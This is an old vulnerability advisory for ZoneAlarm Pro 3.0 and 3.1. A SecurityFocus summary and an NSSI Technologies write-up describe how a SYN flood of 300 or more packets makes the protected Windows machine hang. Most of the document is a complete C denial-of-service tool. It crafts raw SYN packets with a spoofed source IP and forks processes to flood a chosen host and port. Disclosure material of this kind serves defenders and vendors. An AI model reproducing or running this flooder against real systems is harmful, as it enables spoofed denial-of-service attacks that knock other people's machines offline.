source: http://www.securityfocus.com/bid/5975/info

ZoneAlarm is a firewall software package designed for Microsoft Windows operating systems. It is distributed and maintained by Zone Labs.

ZoneAlarm does not properly handle some types of traffic. When ZoneAlarm is configured to block all traffic, and a Syn flood of 300 or more packets is sent to a host running the vulnerable software, the system becomes unstable. This problem has been reported as leading to a denial of service condition. 

/*
Start Advisory
NSSI Technologies Inc Research Labs Security Advisory 
http://www.nssolution.com (Philippines / .ph) 
"Maximum e-security" 
http://nssilabs.nssolution.com
ZoneAlarm Pro 3.1 and 3.0 Denial of Service Vulnerability
Author: Abraham Lincoln Hao / SunNinja
e-Mail: abraham@nssolution.com / SunNinja@Scientist.com
Advisory Code: NSSI-2002-zonealarm3 
Tested: Under Win2k Advance Server with SP3 / WinNT 4.0 with SP6a / Win2K Professional / WinNT 4.0 workstation 
Vendor Status:  Zone Labs is already contacted 1 month ago and they informed me that they going to release an update or new version to patched the problem. 
This vulnerability is confirmed by the vendor.
Vendors website: http://www.zonelabs.com
Severity: High

Overview:

New ZoneAlarm� Pro delivers twice the securityZone Labs award-winning, personal firewall trusted by millions, plus advanced privacy features. 
the award-winning PC firewall that blocks intrusion attempts and protects against Internet-borne threats like worms, Trojan horses, and spyware.   
ZoneAlarm Pro 3.1 and 3.0  doubles your protection with enhanced Ad Blocking and expanded Cookie Control to speed up your Internet experience and stop 
Web site spying. Get protected. Compatible with Microsoft� Windows� 98/Me/NT/2000 and XP.    
ZoneAlarm Pro 3.1.291 and 3.0  contains vulnerability that would let the attacker consume all your CPU and Memory usage that would result to Denial of 
Service Attack through sending  multiple syn packets / synflooding.  

Details:

Zone-Labs ZoneAlarm Pro 3.1.291 and 3.0 contains a vulnerability that would let the attacker consume all your CPU and Memory usage that would result to 
Denial of Service Attack through Synflooding that would cause the machine to stop from responding. Zone-Labs ZoneAlarm Pro 3.1.291 and 3.0 is also vulnerable 
with IP Spoofing. This Vulnerabilities are confirmed from the vendor.

Test diagram:
[*Nix b0x with IP Spoofing scanner / Flooder] <===[10/100mbps switch===> [Host with ZoneAlarm] 
 1] Tested under default install of the 2 versions after sending minimum of 300 Syn Packets to port 1-1024 the machine will hang-up until the attack stopped.
2] We configured the ZoneAlarm firewall both version to BLOCK ALL traffic setting after sending a minimum of 300 Syn Packets to port  1-1024 the machine will
hang-up until the attack stopped. 

Workaround:
Disable ZoneAlarm and Hardened TCP/IP stack of your windows and Install latest Security patch.
Note: To people who's having problem reproducing the vulnerability let me know :)
Any Questions? Suggestions? or Comments? let us know. 
e-mail: nssilabs@nssolution.com / abraham@nssolution.com / infosec@nssolution.com
greetings:
nssilabs team, especially to b45h3r and rj45, Most skilled and pioneers of NSSI good luck!. 
(mike@nssolution.com / aaron@nssolution.com),  Lawless the saint ;), dig0, p1x3l, dc and most of all to my Lorie.  
 
End Advisory

L-zonealarm.c compile with gcc l-zonealarm.c -o l-zonealarm
greets        Valk , harada ,bono-sad , my family .
email         lupsyn@mojodo.it
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <strings.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>

#define MAX_CHILDREN            30

void die(char *msg)
{
        perror(msg);
        exit(errno);
}


void usage()
{
	fprintf(stdout,"\n[************************************]\n"
		  "[*] Zone Alarm dos coded by lupsyn [*]\n"
                  "[*] Usage ./l-za srcIP dstIP port  [*]\n"
                  "[************************************]\n\n");
	exit(0);
}



u_short in_cksum(u_short *addr, int len)    /* function is from ping.c */
{ 
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer =0;
   
    while (nleft > 1) 
       	{
       	sum += *w++;
       	nleft -= 2;
      	}
    if (nleft == 1) 
     	{      
       	*(u_char *)(&answer) = *(u_char *)w;
        sum += answer;
     	}
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return(answer);
}


u_long getaddr(char *hostname)    
{ 
	struct hostent *hp;
  
	if ((hp = gethostbyname(hostname)) == NULL) 
	{
        fprintf(stderr, "Could not resolve %s.\n", hostname);
        exit(1);
        }
    	return *(u_long *)hp->h_addr;
}



void dosynpacket(unsigned char *source_addr, unsigned char *dest_addr, int dest_port)
{
	struct send_tcp
   	{
      	struct iphdr ip;
      	struct tcphdr tcp;
   	} send_tcp;
   
	struct pseudo_header
   	{
      	unsigned int source_address;
      	unsigned int dest_address;
      	unsigned char placeholder;
      	unsigned char protocol;
      	unsigned short tcp_length;
      	struct tcphdr tcp;
   	} pseudo_header;
   
	int tcp_socket;
   	struct sockaddr_in sin;
   	int sinlen;
            
   	/* form ip packet */
   	send_tcp.ip.ihl = 5;
   	send_tcp.ip.version = 4;
   	send_tcp.ip.tos = 0;
   	send_tcp.ip.tot_len = htons(40);
   	send_tcp.ip.frag_off = 0;
   	send_tcp.ip.ttl = 255;
   	send_tcp.ip.protocol = IPPROTO_TCP;
   	send_tcp.ip.check = 0;
   	send_tcp.ip.saddr =inet_addr(source_addr);
   	send_tcp.ip.daddr =inet_addr(dest_addr);
   
   	/* form tcp packet */
   	send_tcp.tcp.dest = htons(dest_port);
   	send_tcp.tcp.ack_seq = 0;
   	send_tcp.tcp.res1 = 0;
   	send_tcp.tcp.doff = 5;
   	send_tcp.tcp.fin = 0;
   	send_tcp.tcp.syn = 1;
   	send_tcp.tcp.rst = 0;
   	send_tcp.tcp.psh = 0;
   	send_tcp.tcp.ack = 0;
   	send_tcp.tcp.urg = 0;
   	send_tcp.tcp.res2 = 0;
   	send_tcp.tcp.window = htons(512);
   	send_tcp.tcp.check = 0;
   	send_tcp.tcp.urg_ptr = 0;
   
   	/* setup the sin struct */
   	sin.sin_family = AF_INET;
   	sin.sin_port = send_tcp.tcp.source;
   	sin.sin_addr.s_addr = send_tcp.ip.daddr;   
   
   	/* (try to) open the socket */
        if((tcp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW))<0) die("socket");
      	/* set fields that need to be changed */
      	send_tcp.tcp.source++;
      	send_tcp.ip.id++;
      	send_tcp.tcp.seq++;
      	send_tcp.tcp.check = 0;
      	send_tcp.ip.check = 0;
      
      	/* calculate the ip checksum */
      	send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);

      	/* set the pseudo header fields */
      	pseudo_header.source_address = send_tcp.ip.saddr;
     	pseudo_header.dest_address = send_tcp.ip.daddr;
      	pseudo_header.placeholder = 0;
      	pseudo_header.protocol = IPPROTO_TCP;
      	pseudo_header.tcp_length = htons(20);
      	bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
      	send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32);
      	sinlen = sizeof(sin);
      	if((sendto(tcp_socket, &send_tcp, 40, 0, (struct sockaddr *)&sin, sinlen))<0) die("sendto");
   	close(tcp_socket);
}

main(int argc, char *argv[])

{
	int i=0,childs;
	if (argc<3) usage();
	fprintf (stdout,"\n[*] Let's start dos  [*]\n");
     	fprintf (stdout,  "[*] Wait 30 sec and after try ping %s at port %d [*]\n",argv[2],atoi(argv[3]));
        fprintf (stdout,  "[*] www.mojodo.it    [*]\n");
	fprintf (stdout,  "[*] esc with ctrl+c  [*]\n\n");

	for (i ; i<400 ;i++)
	{
		if(childs >= MAX_CHILDREN) wait(NULL) ;
		switch (fork())
			{
				case 0:
				dosynpacket(argv[1],argv[2],atoi(argv[3]));
				exit(0);
                        	case -1:
                         	die("fork");
				default:
                        	childs++;
                        	break;
			}


	}while(childs--) wait(NULL);
}
	  			